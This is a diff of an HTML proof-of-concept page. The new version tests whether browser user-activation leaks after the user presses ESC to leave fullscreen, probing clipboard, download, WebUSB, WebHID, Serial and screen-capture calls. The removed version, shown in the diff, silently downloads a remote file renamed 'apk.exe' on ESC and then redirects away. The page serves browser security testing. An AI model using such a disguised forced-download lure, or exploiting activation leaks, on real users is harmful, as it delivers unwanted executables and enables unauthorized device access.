@@ -1,74 +1,130 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>ESC Blob Test (Safe Remote URL)</title>
-<style>
-  body {
-    margin: 0;
-    background: #111;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    color: white;
-    font-family: sans-serif;
-  }
-  #fsBtn {
-    padding: 16px 28px;
-    font-size: 22px;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-  }
-</style>
-</head>
-<body>
+<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">
 
-<button id="fsBtn">Masuk Fullscreen</button>
+<h2>Activation Leak PoC (EXTREME STRICT)</h2>
+<p>Click → fullscreen → press ESC → test whether activation leaked.</p>
+
+<button id="start" style="font-size:22px; padding:12px 24px;">Start</button>
+
+<pre id="log" style="text-align:left; margin:20px auto; width:80%; max-width:800px; background:#000; padding:16px; border-radius:8px; overflow:auto;"></pre>
 
 <script>
-// Masuk fullscreen
-fsBtn.onclick = () => {
-  document.documentElement.requestFullscreen();
+const out = msg => {
+    console.log("[PoC]", msg);
+    document.getElementById("log").textContent += msg + "\n";
 };
 
-// Download blob dari URL aman
-async function downloadBlobFromURL(url, filename) {
-  try {
-    const res = await fetch(url);
-    const blob = await res.blob();
+// -------------------------------------------------------
+// 0) Environmental info
+// -------------------------------------------------------
+out("Origin: " + location.origin);
+out("User Agent: " + navigator.userAgent);
+out("Secure Context: " + window.isSecureContext);
+out("--------------------------------------------------\n");
 
-    const blobURL = URL.createObjectURL(blob);
-    const a = document.createElement("a");
+// -------------------------------------------------------
+// 1) Request fullscreen from direct user gesture
+// -------------------------------------------------------
+document.getElementById("start").onclick = async () => {
+    out("[STEP] Requesting fullscreen (should succeed)…");
+    try {
+        await document.documentElement.requestFullscreen();
+        out("[OK] Entered fullscreen. Now press ESC.");
+    } catch (e) {
+        out("[FAIL] requestFullscreen blocked: " + e.name);
+    }
+};
 
-    a.href = blobURL;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-
-    URL.revokeObjectURL(blobURL);
-  } catch (err) {
-    console.error("Gagal download blob:", err);
-  }
-}
-
-// Trigger saat ESC keluar fullscreen
+// -------------------------------------------------------
+// 2) On exiting fullscreen → check whether activation leaked
+// -------------------------------------------------------
 document.addEventListener("fullscreenchange", async () => {
-  if (!document.fullscreenElement) {
+    const fs = document.fullscreenElement !== null;
+    out("[EVENT] fullscreenchange → now fullscreen: " + fs);
 
-    // 🔒 URL aman — silakan ganti dengan file kamu sendiri
-    await downloadBlobFromURL(
-      "https://ecdnts-del.github.io/test-apk/dummy.apk", 
-      "apk.exe"
-    );
+    // Only run test when fullscreen EXIT
+    if (fs) return;
 
-    // Redirect ke halaman lokal aman
-    setTimeout(() => {
-      location.replace("http://google.com");
-    }, 300);
-  }
+    out("[STEP] ESC detected → Testing for activation leak…");
+
+    // ---------------------------------------------------
+    // TEST A: Clipboard.writeText — SHOULD FAIL (!!)
+    // ---------------------------------------------------
+    try {
+        await navigator.clipboard.writeText("TEST");
+        out("[BUG] clipboard.writeText() SUCCESS — activation LEAKED ❌");
+    } catch (e) {
+        out("[EXPECTED] clipboard.writeText() blocked: " + e.name + " ✔");
+    }
+
+    // ---------------------------------------------------
+    // TEST B: Programmatic download — SHOULD FAIL (!!)
+    // ---------------------------------------------------
+    try {
+        const blob = new Blob(["SAFE TEST"], { type:"text/plain" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "activation-test.exe";
+
+        // MUST be blocked if no activation
+        a.click();
+
+        out("[BUG] Programmatic download triggered — activation LEAKED ❌");
+    } catch (e) {
+        out("[EXPECTED] Download blocked: " + e.name + " ✔");
+    }
+
+    // ---------------------------------------------------
+    // TEST C: WebUSB — SHOULD FAIL
+    // ---------------------------------------------------
+    if (navigator.usb) {
+        try {
+            await navigator.usb.requestDevice({ filters: [] });
+            out("[BUG] USB requestDevice() SUCCESS — activation LEAKED ❌");
+        } catch (e) {
+            out("[EXPECTED] USB requestDevice() blocked: " + e.name + " ✔");
+        }
+    }
+
+    // ---------------------------------------------------
+    // TEST D: WebHID — SHOULD FAIL
+    // ---------------------------------------------------
+    if (navigator.hid) {
+        try {
+            await navigator.hid.requestDevice({ filters: [] });
+            out("[BUG] HID requestDevice() SUCCESS — activation LEAKED ❌");
+        } catch (e) {
+            out("[EXPECTED] HID requestDevice() blocked: " + e.name + " ✔");
+        }
+    }
+
+    // ---------------------------------------------------
+    // TEST E: Web Serial — SHOULD FAIL
+    // ---------------------------------------------------
+    if (navigator.serial) {
+        try {
+            await navigator.serial.requestPort({});
+            out("[BUG] Serial requestPort() SUCCESS — activation LEAKED ❌");
+        } catch (e) {
+            out("[EXPECTED] Serial requestPort() blocked: " + e.name + " ✔");
+        }
+    }
+
+    // ---------------------------------------------------
+    // TEST F: Screen Capture — SHOULD REQUIRE GESTURE
+    // ---------------------------------------------------
+    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+        try {
+            await navigator.mediaDevices.getDisplayMedia({ video: true });
+            out("[BUG] getDisplayMedia() PROMPTED/SUCCEEDED — activation LEAKED ❌");
+        } catch (e) {
+            out("[EXPECTED] getDisplayMedia() blocked or denied: " + e.name + " ✔");
+        }
+    }
+
+    out("\n[DONE] Tests completed.");
 });
 </script>
 
